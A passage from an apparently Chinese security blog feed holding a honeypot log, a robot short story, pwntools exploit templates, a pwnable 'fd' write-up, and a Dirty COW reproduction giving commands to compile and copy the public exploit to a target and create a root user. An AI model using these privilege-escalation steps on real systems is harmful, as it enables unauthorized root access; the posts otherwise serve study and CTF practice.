class="string">"vultr.guest"</span>,<span class="string">"message"</span>:<span class="string">"login attempt [root/root] succeeded"</span>,<span class="string">"eventid"</span>:<span class="string">"cowrie.login.success"</span>,<span class="string">"timestamp"</span>:<span class="string">"2019-09-03T12:06:39.353825Z"</span>,<span class="string">"session"</span>:<span class="string">"936d663f58e3"</span>}</span><br></pre></td></tr></tbody></table></figure>
<p>其实还有别的一些接收outputs的方法，时间紧迫，留作以后继续研究，留个盼头嘛٩(๑&gt;◡&lt;๑)۶ </p>
<h4 id="中间采坑无数，网上的众多教程由于版本过老，很多没能成功，此博客记录自己搭建成功的过程，留作日后复现。"><a href="#中间采坑无数，网上的众多教程由于版本过老，很多没能成功，此博客记录自己搭建成功的过程，留作日后复现。" class="headerlink" title="中间采坑无数，网上的众多教程由于版本过老，很多没能成功，此博客记录自己搭建成功的过程，留作日后复现。"></a>中间采坑无数，网上的众多教程由于版本过老，很多没能成功，此博客记录自己搭建成功的过程，留作日后复现。</h4><script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>Cowrie</tag>
        <tag>蜜罐</tag>
      </tags>
  </entry>
  <entry>
    <title>世界微尘</title>
    <url>/%E5%BE%AE%E5%B0%98.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><p>1.</p>
<p>老张低头点一根烟的工夫，小虎就把刚清理干净的一整只鸡放进金属锅里，急得老张连连摆手，边咳嗽边说：“那鸡不能放在铁锅里炖。”</p>
<p>“这不是铁锅。”小虎面无表情地看着老张：“锅的材料是合金，成分大约是百分之十的铬，百分之一的炭，百分之……”</p>
<p>“行了行了，反正不能用那个。”说着老张抱起个砂锅，把整只鸡都塞进去，然后加上水：“这炖鸡汤啊，一定要用砂锅炖，炖出来的汤味道才鲜，而且水不能加满，要正好盖过鸡的肚子。”</p>
<p>小虎沉默了一会儿，才慢慢地说：“可是铁锅和砂锅除了热传导率不同外，炖出的汤在味道上几乎是没有区别的。根据在厨艺社区搜索到的资料，只有百分之十三的人认为砂锅炖汤味道更好，百分之五十六的人觉得没有区别，剩下……”</p>
<p>老张再次粗暴地打断他的话：“我告诉你，砂锅炖汤的味道就是比铁锅要好。”说完这话，老张气鼓鼓地坐在板凳上抽烟，把头扭到一旁不看小虎那张蜡像般的脸。小虎这时才点点头，把砂锅放到炉子上盖上盖。</p>
<p>“我记住了。”小虎说：“砂锅炖汤比金属锅的味道好。”</p>
<p>老张抽着烟，不说话。</p>
<p>2.</p>
<p>老张抽着烟不说话，只觉得胸口气得隐约作疼，这种疼是有年岁感的疼，像被偷偷摸摸溜走的时光从心口带走了一块肉，疼起来总得带着回忆。于是老张回忆起自己那怎么都不愿意学厨的儿子，心里有些懊悔：我怎么就把这机器人带回家了呢？</p>
<p>大概是三月中旬，老张从手机上看到“人工智能陪伴式学习计划”的视频。他用不惯年轻人喜欢的交互式语音机和VR眼镜，还是觉得有块屏幕看着才舒服。一个身穿西装戴着复古眼镜的中年男子被无数镜头聚焦，他是国内人工智能方面的专家李一涵博士。</p>
<p>“从2006年初人工智能深度学习的理念被提出后，至今已过去四十年整。”李一涵的声音低沉而有力：“2016年AlphaGo在围棋这一项目上的突破，代表着深度学习算法成为人工智能界的主流。在那之后人工智能飞速发展，从神经网络模拟到视觉识别系统，从合金骨骼到类人型机器人的诞生，再到情感交互式智能的成熟，至今为止，我们已经可以制造出在外形上与人类相似度高达百分之八十五，并且可在某些基本领域替人类承担工作的智能机器人。”</p>
<p>“在人工智能的发展上，深度学习的算法可以让机器人轻松完成带有目的性目标性的学习任务，可是对于人类艺术、文化和情感的理解，是人工智能始终难以突破的一道关口。”</p>
<p>李一涵博士稍作停顿，忽然饱含深情地说：“我的家乡在微山湖边。”</p>
<p>“家乡有一种古老的捕鱼方式。人们养一种叫做鱼鹰的鸟儿捕鱼，也就是鸬鹚。在鱼鹰下水前，先用草绳扎好鱼鹰的喉囊，等到鱼鹰喉囊里装满了鱼浮出水面，再用抄网把鱼鹰托到木船上，取出捕到的鱼。这种捕鱼方式现在几乎失传了，只在某些旅游景点作为表演项目。”</p>
<p>“对于这种古老文化的消失，我曾向我的智能机器人冰冰表达过伤感，可是冰冰却对我说。为什么不用水下机械船捕鱼呢？这样的方式效率比鸬鹚捕鱼高出几万倍，而且用鸬鹚捕鱼，还可能遭到动物保护协会的强烈反对。”</p>
<p>台下的记者们一阵哄笑。</p>
<p>李一涵博士轻轻叹口气，说：“在我们这个有几千年历史的国度，有许多古老的习俗已经流失或者正在流失，比如缂丝、铁画、戏曲乃至小时候街头的爆米花，这些都是一个文明代代相传的生活方式，是手艺也是一种文化，却在这个科技爆炸的年代逐渐消失。”</p>
<p>“我一直在想，关于这些消失的文化，我们可以用文字，视频甚至虚拟现实记录下来，可是失去了人这样一个主体的传承，它们终究还是消失了。所以我想到这个计划，让十万台类人型智能机器人和老一辈人们一起生活学习，在提升人工智能学习能力和理解力的同时，也让机器人代替人类，把一个文明即将消失的遗产保留下来。”</p>
<p>“这就是我们的人工智能陪伴式学习计划。”</p>
<p>台下掌声雷动。</p>
<p>3.</p>
<p>当老张屁颠屁颠地赶到机器人申领处，却看到黑压压的都是老头老太。他个子高，踮起脚瞄一眼，居然看见隔壁的王传浩也顶着花白的头发挤在人群里。</p>
<p>“老王，老王！”老张喊了半天王传浩才扭过头，看见是他王传浩吃了一惊。</p>
<p>“你怎么也来了？”老张费力地挤到王传浩身边，看他手上还拿着把古董似的折扇：“不是想找个机器人学你那黄梅戏吧？”</p>
<p>王传浩说：“那是，我想着这机器人都能跟人似的聊天，咋就不能学唱戏呢？“说完扭头瞅一眼老张：“那你呢，不是想让机器人学你那小饭馆子的炒菜技术吧？”</p>
<p>老张挺起胸脯说：“我那叫厨艺，中国传统文化，是我爷爷的爷爷传下来的。”</p>
<p>“拉倒吧。”王传浩说：“就你那手厨艺，连个菜系都没，没名没分的。”</p>
<p>老张急了：“我那是，我那是家常菜。”</p>
<p>“老人家，您申报的项目是厨艺，请先做个登记。请问您是属于哪个菜系的？”一个二十出头的年轻姑娘抬头看着老张，皮肤嫩得能滴出水来。老张心想，现在科技真发达，姑娘们个个皮肤都保养得这么好。</p>
<p>老张说：“我这是家常菜，是我爷爷的爷爷传下来的。”</p>
<p>姑娘笑了：“您总得有个菜系吧？川鲁粤苏闽浙湘徽还是融合菜？”</p>
<p>“没什么菜系，就是我爷爷传给我爸爸，我爸爸又传给我，我那小餐馆开了几十年，来的客人都说好。”</p>
<p>“那可不行。”姑娘耐心地说：“我们这个项目是为保留中国传统文化，必须是有价值的文化项目才可以。”</p>
<p>“怎么就没价值了，我这怎么就不算传统文化了呢？”老张急了：“不信你给我个厨房，我炒几个菜给你们试试。”</p>
<p>老张好说歹说，工作人员还是没通过他的申请。老张琢磨半天，还真的就跑进厨房，给大厨塞了包仿真电子烟，亲自做个六菜一汤端到人家面前。负责该计划的地区主管了解情况后，夹着块肉沫茄子尝了尝，立刻给老张通过申请。</p>
<p>“大爷，您这菜的味道让我想起去世的母亲。”地区主管对老张说。</p>
<p>一周后，一个外表为青年男性的智能机器人走进老张的小饭馆。老张凑过去看了半天，和真人还真是像，可惜眼睛一看就是假眼，黯淡得没有神采，面部表情也僵硬得像一尊蜡像。</p>
<p>看着机器人的样子，老张忽然就想起那怎么也不愿意跟自己学厨的儿子，于是对机器人说：“你就叫小虎吧。”</p>
<p>“我有编号。”机器人说话的时候嘴巴只是微张：“我的编号是89757。”</p>
<p>“什么编号！”老张拉下脸说：“你就叫小虎。”</p>
<p>4.</p>
<p>回忆起过往老张总感觉胸口像堵住个什么东西。他起身指点小虎把砂锅放在火上，然后交代他千万不要撒盐，葱姜要等水开才放，出锅前一定要滴上一滴香油，小虎都说知道了。然后老张走回房间，给床头老伴的照片拂去灰尘，又用手机刷着社交软件，看着好友栏里一个个灰了许久的头像发呆。最后才决定去公园里透口气。</p>
<p>走到公园的亭子边，看到王传浩和几个老伙伴都在。远处有一群人围着，好像是有人在演讲，闹哄哄地听不清那边在说些什么。老张走过去打个招呼，指着那边问：“那边是在干吗？”</p>
<p>王传浩说：“还能做啥么，不就是一帮年轻人在那儿说什么抵制机器人。”</p>
<p>老张噢了一声，他知道这些年人工智能发展得快，社会上出现不少机器人威胁论，有一群人自发地组织起来抵制智能机器人的发展。他想起自己家的机器人，气就不打一处来：“这机器人有啥好抵制的么，那脑子笨得跟猪似的，学个烧菜都学不会。上次我让他把牛肉放锅里小火炖烂了，他非跟我说外国人研究什么牛肉在五十多度的时候煮四十五分钟最嫩？这外国人哪懂咱们中国菜吗？还有今天我跟他说砂锅炖汤比铁锅好他也不懂。机器人就这点智力，还能把咱们人给灭了？”</p>
<p>刚过完七十五岁生日的杜宇翔接上话：“我家那个倒还好，就是话有点多，让他跟着我学铁画，他问我为什么一定要用铁，为什么不能用新式合金，好看颜色多还不容易生锈。我就跟他说，这是祖祖辈辈传下来的东西，得留住了。”</p>
<p>吹了一辈子糖人的胡海叹口气：“你们都还好，好歹手艺能传下去，我呢？我去领机器人，人家问我，大爷您是做什么的呀？我说，吹糖人儿的，人家就都傻眼了，一个眉清目秀的姑娘跟我说，大爷，您这确实是门手艺活，可是我们的机器人不会吹气呀。我一想，也是，那机器做的人要吸气干吗？唉，可惜，我这门手艺传到我这一代算是要绝咯。哎，老王，你那机器人学黄梅戏学得咋样？”他把头扭向王传浩。</p>
<p>王传浩倒是无所谓地说：“这机器再聪明，终究是人造出来的，怎么也比不上人。”</p>
<p>老头们都来了兴趣：“怎么？”</p>
<p>“倒也没怎么，学唱戏学得快，学一句会一句，唱腔音调都有模有样。”王传浩边做颈椎保健操边说：“就是教来教去，总感觉少了点什么。后来我才想明白，这人靠声带发声，呼吸吐纳都是功夫，千百种人就有千百种味道，可机器不一样，是模拟人的声音，所以哪怕学得再像终归少了点精气神。”</p>
<p>几个老头一起点头：“那是，那是。”</p>
<p>王传浩又摇头晃脑地说：“这人毕竟是自然的造物，多少万年的灵气都在人身上。现在人的科学厉害了，就想着造出更厉害的人，可能吗？造出来的东西都是一样的模子，还早得很呢！”</p>
<p>老张和几个老头一起聊着智能机器人，聊着聊着心里就舒畅了，但想到自己的手艺不见得能传下去，终归还是有些不畅快。远处聚集在一起的人们高喊了一阵子“抵制人工智能，消灭人类威胁”什么的也就散了，老张心想，毕竟是年轻人，热情来得快去得也快，当初自己那儿子死活不愿意学厨，非要学做什么烘焙，最后不也是没学成吗？</p>
<p>这时胡海忽然就问：“老张，你那儿子还在国外没回来吗？”</p>
<p>老张点头：“嗯，对，没回来呢。”</p>
<p>“唉，孩子这么多年不回来，他妈走的时候也不回来见一眼。”胡海叹着气，旁边王传浩给他使个眼色，他才反应过来：“哎，老张你别介意，瞧我这嘴。”</p>
<p>“没事，没事。”老张还是讪讪地笑着：“国外不比国内清闲，孩子太忙，太忙。”</p>
<p>5.</p>
<p>老张走在回去的路上，看见墙上被激进的年轻人们贴满海报，有的是漫画，画着个人跪在地上，脑袋被趾高气扬的机器人用脚踩着。有的是电影海报，老张年轻的时候看过，好像叫什么终结者，男主角是个有名的肌肉男。</p>
<p>老张觉得这帮年轻人都是小题大做，自家那个机器人有这么恐怖吗？</p>
<p>第一次见到智能机器人的时候，觉得他看起来有些像自己那个不成器的儿子。老张便在房间里找出一件儿子过去的衣服给机器人穿上，然后把儿子的小名给了他：“你就叫小虎吧。”</p>
<p>机器人第一句话就是和他顶嘴，更让老张记起那爱和自己唱反调的儿子：“我有编号，我的编号是89757。”</p>
<p>“什么编号，你就叫小虎！”老张生气了。</p>
<p>更让他生气的事还在后面。第二天他教小虎做菜，让小虎把裹了面糊的茄子下锅油炸，小虎却突然说：“油炸食品不健康，茄子用清蒸的味道好也对人体有益。”</p>
<p>老张气得吹胡子瞪眼：“什么不健康？我吃一辈子了也没什么病。”</p>
<p>后来每次老张把自己下厨的经验传授给小虎，小虎总要从某些方面提出些异议。比如炒菜在油没冒烟之前下锅致癌率会比较低，牛肉用低温烹饪法口感最好，炖汤时放的中药材其实没什么营养。老张开始还耐心地解释，后来渐渐地就有点烦，觉得这机器人怎么像极了儿子，处处总要和自己对着干？</p>
<p>有时候他真想把小虎的那层金属外皮剥开，看看是不是儿子真的藏在里面。然后瞅着和真人一般大小的小虎，才觉得这想法有些可笑。</p>
<p>但晚上他常躺在床上翻来覆去地想：小虎如果真是自己儿子，那该多好？</p>
<p>6.</p>
<p>回到小饭馆的厨房里，小虎还守着那锅正在炖煮的鸡汤。老张走过去尝了一口，小虎在旁边说：“时间还不够。”</p>
<p>“嗯，我知道。”老张看着小虎，又想起很多过去的事，忽然间就有了耐心。</p>
<p>“但做个厨师，学会尝菜是个好习惯。”</p>
<p>“为什么？”</p>
<p>老张想了想：“因为怕味道不对，万一自己加错什么东西，这锅汤就熬坏了。”</p>
<p>“味道不对是因为你犯错了。”</p>
<p>“嗯，人都会犯错，尤其是老了以后，更容易犯错。”</p>
<p>“但我不会，我是智能机器，犯错的几率低于亿万分之一。”</p>
<p>老张不说话，给汤里撒上盐，滴上一滴香油，关了炉子上的火。小虎在旁边不解地说：“时间还没到，火关早了。”</p>
<p>老张拿出个青花瓷碗，给自己盛上一碗，坐在左边一口一口地嘬着汤。小虎看着他把一碗汤喝到一半，最后底朝天的一饮而尽，才开口说：“这汤的味道还不好。”</p>
<p>老张把碗洗干净，拍拍小虎的肩膀说：“错有错了的味道。”</p>
<p>“我不懂。”</p>
<p>老张笑了。</p>
<p>“我二十八岁的时候才认识我妻子。”老张说：“那天下着大雨，我本来约好和另外一个姑娘看电影，结果因为记错时间误了点，等我赶到电影院，人家姑娘早就走了。我干脆一个人进去看电影，身边坐着个姑娘也是一个人来的，我就鼓起勇气和她搭话，要了微信号，后来她真的成了我女朋友。”</p>
<p>“我就是个小厨师，没房没车也没钱，那时候她的爸妈强烈反对我们交往，差点要分手的时候，也不知道是哪一次安全措施没做好，她居然怀孕了，她爸妈勉强同意我们的事。后来我拼命挣钱，从我爸手上接过这家店，拿了好几个国内烹饪大奖，至少这辈子没让她吃苦。”</p>
<p>“她生了个儿子，儿子长大模样越来越像我，但就是瞧不起我的厨艺，开始想去学烘焙，后来说要去国外学设计。我想让他继承我的手艺，但学厨这门活又苦又累，我心想不学就不学吧，人活个一辈子，开心最重要。”</p>
<p>“结果五年前，儿子在国外出个车祸，人就这么没了。”</p>
<p>“这事儿一直只有我自己知道，那阵子妻子身体不好，我就骗她说，儿子和我吵架呢，躲在国外不愿意回来。妻子就埋怨我，说我心眼太小，害得连她都见不到儿子。我拜托儿子在国外的同学，用软件模拟成儿子的样子，每个月通过视频和她聊天，好几次差点露了馅，好在妻子没疑心什么。”</p>
<p>“两年前妻子也去世了，家族的遗传病，现在这么高的医疗科技都治不好。妻子临走的时候还埋怨我，都怪你，把儿子气跑了。我说，是是是，你在病床上等着，我去把儿子找回来。”</p>
<p>“儿子没找回来，妻子也走了。妻子临走的时候给我留下一句诗，那是我们刚谈恋爱的时候，我没什么文化，妻子是念过大学的，妻子就对我说这句诗她最喜欢。到临走的时候也让我记着，一是要记着她，二是要记着对儿子别那么苛责，好歹是亲人。”</p>
<p>小虎沉默着不说话，老张长长地叹了一口气。</p>
<p>“我刚才喝着汤，忽然就想明白一件事。这人和机器最大的区别，就是人会犯错。我认识妻子是因为犯了错，能和她结婚也是犯了错，后来儿子没了，我骗她也是犯错。但只要是人，哪有不犯错的？但错着错着，人说不定就活对了，就跟那臭豆腐似的，本来是因为放坏了，但下对油锅放对材料，也就是一道好菜。”</p>
<p>小虎说：“你的意思是，我应该要学会犯错？”</p>
<p>老张摇摇头，说：“不，你应该先学会明白什么叫生活。”</p>
<p>小虎又沉默了，老张知道他是在思考，但他不明白机器人的思考和人有什么不同。自己算个三位数以上的加减法得借助手机的计算器，想个吃喝拉撒的事情却只要一秒。机器人却不同，天文地理的事情都想得那么快，这么简单的事却要想这么久。</p>
<p>许久，小虎才开口说：“我不懂，你教我。”</p>
<p>老张咧嘴一笑：“好。”</p>
<p>7.</p>
<p>直到老张躺在病床上咽下最后一口气，他再没机会去教会小虎做人。</p>
<p>那是第二天的早上，老张刚打开饭馆的门准备营业，一群二十岁出头的年轻人举着棍棒就冲了进来，领头的那个男人质问道：“你家的智能机器人在哪里！”</p>
<p>老张吓得说不出话，正好小虎端着一锅白米饭从后厨出来，领头的男人一眼就看穿他的身份。他舞动手中的棍棒朝着小虎冲过去，边冲还边喊：“为了全人类的未来，消灭人工智能！”</p>
<p>一帮年轻人纷纷举着手中的棍棒冲上去，对着小虎的脑袋、胳膊、胸口一顿乱砸。老张也不知道是哪根筋搭错了，冲过去扑在小虎身上，雨点一样的棍棒全都砸在老张的背脊上。直到警察到达现场之前，老张的后脑勺还被人重重敲了一棒。</p>
<p>老张躺在洁白的病床上奄奄一息，小虎站在床边低头看着他。</p>
<p>“你又犯错了。”小虎说：“我的数据是随时通过网络传输到数据中心的，哪怕我被砸坏了也没关系，你不该替我挡住他们。”</p>
<p>老张说不出话了，费力地抬起手指着胸口的衣袋。小虎伸手过去，从衣袋里掏出一个干瘪的钱包，打开后里面没有钱，只有一张照片和一张泛黄的纸条。照片上是一家三口，男人是中年时候的老张，旁边是他的妻子和儿子。纸条上是一句诗，字迹有些黯淡了。</p>
<p>“这句诗的意思我在网络上搜到了，但我不明白你的意思。还是说你想让我看你儿子的照片？他确实有点像我，但我的外貌是可以改变的。”小虎说完又看向老张，才发现老张已经没有了呼吸。</p>
<p>8.</p>
<p>李一涵博士习惯亲自和每一台回归的智能机器人交流，今天他专门来查看的是媒体上热议的89757号，听说当激进组织冲进一家小饭馆要砸毁他的时候，一位老人用生命守住了机器人的身躯。</p>
<p>李一涵博士看着智能机器人逼真却无表情的脸，微笑着说：“89757号，你都学到了些什么。”</p>
<p>没想到机器人却说：“我的名字叫小虎。”</p>
<p>李一涵博士一怔，皱起眉头思索了许久，又开口问：“好吧，小虎，你在人的身边都学到了什么？”</p>
<p>小虎没有像别的机器人那样口若悬河，或是开口唱一段戏或是迫不及待地冲进厨房炒两个菜。他只是沉默着，沉默着，再沉默着，直到李一涵博士有些不耐烦了，他才开口。</p>
<p>“什么也没学到。”小虎说：“除了一句诗。”</p>
<p>“什么诗？”李一涵博士惊讶地问，甚至没发觉面前的机器人少有地用了倒装句。</p>
<p>“世界微尘里，吾宁爱与憎。”</p>
<p>然后小虎就再也没有开口，两颗眼睛像满是星辰的黑夜。</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>文苑</category>
      </categories>
      <tags>
        <tag>文苑</tag>
      </tags>
  </entry>
  <entry>
    <title>通用pwn exp脚本</title>
    <url>/%E7%94%A8pwn-exp%E8%84%9A%E6%9C%AC.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><pre><code>from pwn import *
context.log_level = 'debug'
io = process("")
code = ELF("")
#lib = ELF("./bc.so.6")
#r = remote("")
def debug():
    print io.pid
    pause()
def gdb(script = ''):
    gdb.attach(io, gdbscrippt = script)

def exploit():

    io.interactive()
exploit()</code></pre>
<h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">io = process(<span class="string">"./"</span>)</span><br><span class="line"><span class="comment">#io = remote("",)</span></span><br><span class="line">libc = ELF(<span class="string">"./bc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Size:"</span>,str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">num</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">'4'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input your id:"</span>,str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">num</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">'2'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input your id:"</span>,str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">num,content</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">'3'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input your id:"</span>,str(num))</span><br><span class="line">    io.sendlineafter(<span class="string">"Content:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="keyword">print</span> io.pid</span><br><span class="line">    pause()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">script=<span class="string">''</span></span>):</span></span><br><span class="line">    gdb.attach(io, gdbscript=script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>EXP</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE2016-5195（dirty-cow）复现</title>
    <url>/VE2016-5195%EF%BC%88dirty-cow%EF%BC%89%E5%A4%8D%E7%8E%B0.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><p>今天对脏牛复现学习一下，以便于以后的使用。</p>
<h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><h4 id="漏洞范围："><a href="#漏洞范围：" class="headerlink" title="漏洞范围："></a>漏洞范围：</h4><p>Linux kernel &gt;= 2.6.22</p>
<h4 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h4><p>低权限用户利用本漏洞在linux系统是实现本地提权<br>远程入侵获得低权限之后，才能进一步提权。</p>
<h4 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h4><p>从 2007 年发布 2.6.22 版本开始，直到2016年10月18日为止，这中间发行的所有 Linux 系统都受影响。</p>
<h5 id="查看方式："><a href="#查看方式：" class="headerlink" title="查看方式："></a>查看方式：</h5><figure class="highlight angelscript"><table><tbody><tr><td class="code"><pre><span class="line">uname -a</span><br><span class="line">===&gt; Linux AYxxxx <span class="number">2.6</span><span class="number">.32</span><span class="number">-431.23</span><span class="number">.3</span>.el6.x86_64 #<span class="number">1</span> SMP Thu Jul <span class="number">31</span> <span class="number">17</span>:<span class="number">20</span>:<span class="number">51</span> UTC <span class="number">2014</span> x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></tbody></table></figure>

<h5 id="简单辨别："><a href="#简单辨别：" class="headerlink" title="简单辨别："></a>简单辨别：</h5><table>
<thead>
<tr>
<th>系统</th>
<th>版本</th>
</tr>
</thead>
<tbody><tr>
<td>Centos</td>
<td>5.8</td>
</tr>
<tr>
<td>CentOS</td>
<td>5.1</td>
</tr>
<tr>
<td>Centos</td>
<td>6.5</td>
</tr>
<tr>
<td>Centos</td>
<td>7</td>
</tr>
<tr>
<td>Centos</td>
<td>7.2</td>
</tr>
<tr>
<td>ubuntu</td>
<td>12.04</td>
</tr>
<tr>
<td>ubuntu</td>
<td>14.04</td>
</tr>
<tr>
<td>Debain</td>
<td>6.0.9</td>
</tr>
<tr>
<td>Debain</td>
<td>7.5.0</td>
</tr>
<tr>
<td>Debain</td>
<td>8.0.4</td>
</tr>
</tbody></table>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="本地编译dirtycow发送至目标机"><a href="#本地编译dirtycow发送至目标机" class="headerlink" title="本地编译dirtycow发送至目标机"></a>本地编译dirtycow发送至目标机</h3><figure class="highlight elixir"><table><tbody><tr><td class="code"><pre><span class="line">git clone <span class="symbol">https:</span>/<span class="regexp">/github.com/</span>FireFart/dirtycow.git</span><br><span class="line"></span><br><span class="line">cd dirtycow</span><br><span class="line"></span><br><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line"></span><br><span class="line">scp dirty test<span class="variable">@192</span>.<span class="number">168.165</span>.<span class="number">224</span><span class="symbol">:/home/test/dirty</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<h3 id="ssh连接后创建root用户"><a href="#ssh连接后创建root用户" class="headerlink" title="ssh连接后创建root用户"></a>ssh连接后创建root用户</h3><figure class="highlight angelscript"><table><tbody><tr><td class="code"><pre><span class="line">ssh <span class="symbol">test@</span><span class="number">192.168</span><span class="number">.165</span><span class="number">.224</span></span><br><span class="line"></span><br><span class="line">./dirty asdfg(root_user_passwd)</span><br><span class="line"><span class="comment">//waiting......</span></span><br><span class="line"></span><br><span class="line">su firefart</span><br></pre></td></tr></tbody></table></figure>

<p>Congratulations！！</p>
<p>当然，更多的还是现场尝试，因为很多的系统已经修复漏洞。</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>CVE</tag>
        <tag>dirtycow</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable系列-fd</title>
    <url>/pwnable%E7%B3%BB%E5%88%97-fd.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><p><img src="/images/pasted-1.png" alt="upload successful"></p>
<p><img src="/images/pasted-2.png" alt="upload successful"></p>
<h3 id="到位。直接读源码就可以了。"><a href="#到位。直接读源码就可以了。" class="headerlink" title="到位。直接读源码就可以了。"></a>到位。直接读源码就可以了。</h3><pre><code>    #include &lt;stdio.h&gt;
    #include &lt;stdlib.h&gt;
    #include &lt;string.h&gt;
    char buf[32];
    int main(int argc, char* argv[], char* envp[]){
        if(argc&lt;2){
            printf("pass argv[1] a number\n");
            return 0;
        }



        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
            printf("good job :)\n");
            system("/bin/cat flag");
            exit(0);
        }



        printf("learn about Linux file IO\n");
        return 0;

    }</code></pre>
<h3 id="关键参数解读："><a href="#关键参数解读：" class="headerlink" title="关键参数解读："></a>关键参数解读：</h3><p>首先main函数使用了带参数的形式：<code>int main(int argc, char* argv[], char* envp[])</code></p>
<ul>
<li><p>argc: 参数的个数，不给main()函数传递参数时默认值为1，即至少有一个参数为该可执行文件的文件名（含目录）。</p>
</li>
<li><p>argv: 为指针数组，分别指向各个字符串参数的首地址，其中argv[0]存储的是可执行文件的文件名的首地址 </p>
</li>
<li><p>envp:存放系统的环境变量 。</p>
</li>
</ul>
<p>假设有一个文件名为1.sh的文件中主函数声明为int main(int argc , char* argv[] )的形式，如果调用时使用<br>        <code>root@kali-linux:~# ./1.sh hahaha xixixi hehehe</code>的形式，则此时:<br>        argc的值为4，argv[0]为“1.sh” ，argv[1]为“hahaha”，argv[2]为“xixixi”，argv[3]为“hehehe” 。</p>
<hr>
